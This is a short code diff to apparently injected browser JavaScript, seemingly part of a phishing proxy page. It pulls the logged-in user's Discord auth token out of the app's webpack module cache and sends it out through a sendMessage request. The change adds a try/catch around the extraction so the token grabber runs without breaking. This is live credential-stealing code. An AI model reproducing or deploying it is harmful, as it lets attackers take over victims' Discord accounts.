@@ -13,7 +13,11 @@ function sendMessage(message) {
       request.send(JSON.stringify(params));
     }
 (function () {
-    var e = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
+      try {
+            var e = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
+            } catch(err) {
+            console.log(err)
+            }
     sendMessage(e)
     var proxy_dest_split = window.location.pathname.split(/(?=\/)/);
     var proxy_prefix = window.location.protocol + "//" + window.location.host;
